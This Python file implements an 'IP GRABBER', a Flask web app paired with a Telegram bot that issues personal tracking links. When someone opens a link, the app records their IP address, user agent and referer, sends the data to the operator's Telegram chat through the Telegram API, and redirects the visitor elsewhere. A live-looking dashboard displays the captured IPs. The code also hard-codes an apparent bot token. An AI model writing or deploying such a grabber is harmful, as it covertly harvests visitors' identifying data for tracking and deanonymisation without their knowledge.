import os
import json
from datetime import datetime
from flask import Flask, request, render_template_string
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, CallbackContext
import uuid
import threading
import requests

# ТВОИ ДАННЫЕ
BOT_TOKEN = "8429666405:AAE1E9uCsO1kckVPlGYi7XDH75aCqi8VKvo"
CHAT_ID = 6392594379  # ТВОЙ Telegram ID

app = Flask(__name__)
user_links = {}
logs = []

@app.route("/")
def dashboard():
    return render_template_string("""
<!DOCTYPE html>
<html><head><title>IP GRABBER</title>
<meta charset="UTF-8">
<style>body{display:flex;flex-direction:column;align-items:center;padding:20px;background:#1a1a2e;color:white;font-family:Arial;}
.card{background:#16213e;padding:20px;border-radius:10px;margin:10px 0;max-width:800px;width:100%;}
h1{text-align:center;color:#4ade80;}
.log{border-left:4px solid #4ade80;padding:10px;margin:10px 0;background:#0f3460;}
.ip{font-weight:bold;font-size:1.2em;}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;margin:20px 0;}
.stat{background:#0f3460;padding:15px;border-radius:8px;text-align:center;}</style>
</head><body>
<h1>🎯 IP GRABBER DASHBOARD</h1>
<div class="stats">
<div class="stat"><h2>{{ total }}</h2><p>Переходов</p></div>
<div class="stat"><h2>{{ users }}</h2><p>Пользователей</p></div>
<div class="stat"><h2>{{ ips }}</h2><p>Уникальных IP</p></div>
</div>
<h3>📋 Последние переходы:</h3>
{% for log in logs[-10:] %}
<div class="log">
<div class="ip">🌐 {{ log.ip }} <span style="background:#4ade80;color:black;padding:3px;border-radius:3px;">{{ log.user_id }}</span></div>
<div>{{ log.timestamp }}</div>
<div>{{ log.user_agent[:60] }}...</div>
</div>
{% endfor %}
<script>setInterval(()=>location.reload(),3000);</script>
</body></html>
    """, total=len(logs), users=len(user_links), ips=len(set(l['ip']for l in logs)), logs=logs)

@app.route("/visit/<int:user_id>/<unique_id>")
def grab_ip(user_id, unique_id):
    data = {
        "timestamp": datetime.now().strftime("%d.%m.%Y %H:%M:%S"),
        "user_id": user_id, "unique_id": unique_id,
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent", "N/A"),
        "referer": request.headers.get("Referer", "Direct")
    }
    
    if user_id in user_links and user_links[user_id]["unique_id"] == unique_id:
        user_links[user_id]["visits"] = user_links[user_id].get("visits", 0) + 1
        logs.append(data)
        send_alert(data)
    
    return "<h1 style='text-align:center;color:green;font-size:5rem;margin-top:20%;'>✅ ГОТОВО!<script>setTimeout(()=>location.href='https://t.me/durov',2000);</script>"

def send_alert(data):
    text = f"🎯 <b>IP ПОЙМАН!</b>\n🆔 {data['user_id']}\n🌐 <code>{data['ip']}</code>\n📱 {data['user_agent'][:50]}...\n⏰ {data['timestamp']}"
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                     json={"chat_id":CHAT_ID,"text":text,"parse_mode":"HTML"})
    except: pass

async def start(update: Update, context: CallbackContext):
    user_id = update.effective_chat.id
    username = update.effective_chat.username or "NoName"
    
    if user_id not in user_links:
        unique_id = str(uuid.uuid4())[:6]
        render_url = "https://telegram-bot-u5fe.onrender.com"  # ← ЗАМЕНИ НА СВОЙ!
        user_links[user_id] = {
            "username": username, "unique_id": unique_id,
            "url": f"{render_url}/visit/{user_id}/{unique_id}"
        }
    
    link = user_links[user_id]["url"]
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔥 ЛИЧНАЯ ССЫЛКА", url=link)]])
    await update.message.reply_text(f"👋 @{username}\n\n🔗 <code>{link}</code>", reply_markup=keyboard, parse_mode="HTML")

async def echo(update: Update, context: CallbackContext):
    await start(update, context)

if __name__ == "__main__":
    # Telegram бот в фоне
    def run_bot():
        app = ApplicationBuilder().token(BOT_TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo))
        app.run_polling(drop_pending_updates=True)
    
    threading.Thread(target=run_bot, daemon=True).start()
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
